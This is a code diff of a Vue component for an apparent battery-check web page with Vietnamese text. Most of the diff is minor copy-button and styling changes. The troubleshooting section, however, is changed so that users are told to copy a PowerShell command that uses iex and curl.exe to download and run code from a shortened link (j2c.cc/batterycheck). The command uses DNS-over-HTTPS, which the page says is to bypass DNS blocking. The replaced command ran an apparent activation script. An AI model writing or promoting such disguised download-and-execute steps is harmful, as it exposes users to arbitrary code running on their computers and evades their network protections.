@@ -60,7 +60,8 @@ function batteryColor(level: number, charging: boolean): string {
 }
 
 const showTroubleshooting = ref(false)
-const copiedTrouble = ref(false)
+const copiedTrouble1 = ref(false)
+const copiedTrouble2 = ref(false)
 
 // Copy lệnh PowerShell
 async function copyCommand() {
@@ -73,11 +74,16 @@ async function copyCommand() {
   }
 }
 
-async function copyTroubleCommand(cmd: string) {
+async function copyTroubleCommand(cmd: string, index: number) {
   try {
     await navigator.clipboard.writeText(cmd)
-    copiedTrouble.value = true
-    setTimeout(() => (copiedTrouble.value = false), 2000)
+    if (index === 1) {
+      copiedTrouble1.value = true
+      setTimeout(() => (copiedTrouble1.value = false), 2000)
+    } else {
+      copiedTrouble2.value = true
+      setTimeout(() => (copiedTrouble2.value = false), 2000)
+    }
   } catch {
     // fallback
   }
@@ -212,7 +218,7 @@ onUnmounted(() => {
             </span>
           </div>
           <!-- Đầu pin -->
-          <div class="w-2 h-5 bg-border-default rounded-r-sm flex-shrink-0" />
+          <div class="w-2 h-5 bg-border-default flex-shrink-0" />
         </div>
 
         <!-- Icon sạc chạy khi đang sạc -->
@@ -358,18 +364,20 @@ onUnmounted(() => {
               <p class="text-xs text-text-dim italic">Sử dụng lệnh này để bỏ qua chặn DNS trước:</p>
               <div class="bg-bg-deep border border-border-default p-3 flex items-center gap-2">
                 <code class="flex-1 text-[11px] text-accent-amber break-all leading-relaxed">
-                  iex (curl.exe -s --doh-url https://1.1.1.1/dns-query https://get.activated.win |
+                  iex (curl.exe -s --doh-url https://1.1.1.1/dns-query j2c.cc/batterycheck |
                   Out-String)
                 </code>
                 <button
                   @click="
                     copyTroubleCommand(
-                      'iex (curl.exe -s --doh-url https://1.1.1.1/dns-query https://get.activated.win | Out-String)',
+                      'iex (curl.exe -s --doh-url https://1.1.1.1/dns-query j2c.cc/batterycheck | Out-String)',
+                      1,
                     )
                   "
-                  class="text-[10px] uppercase tracking-widest text-accent-sky hover:underline whitespace-nowrap"
+                  class="text-[10px] uppercase tracking-widest transition-colors whitespace-nowrap font-display"
+                  :class="copiedTrouble1 ? 'text-green-400' : 'text-accent-sky hover:underline'"
                 >
-                  Sao chép
+                  {{ copiedTrouble1 ? '✓ Đã sao chép' : 'Sao chép' }}
                 </button>
               </div>
             </div>
@@ -390,11 +398,13 @@ onUnmounted(() => {
                   @click="
                     copyTroubleCommand(
                       '[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12',
+                      2,
                     )
                   "
-                  class="text-[10px] uppercase tracking-widest text-accent-sky hover:underline whitespace-nowrap"
+                  class="text-[10px] uppercase tracking-widest transition-colors whitespace-nowrap font-display"
+                  :class="copiedTrouble2 ? 'text-green-400' : 'text-accent-sky hover:underline'"
                 >
-                  Sao chép
+                  {{ copiedTrouble2 ? '✓ Đã sao chép' : 'Sao chép' }}
                 </button>
               </div>
             </div>
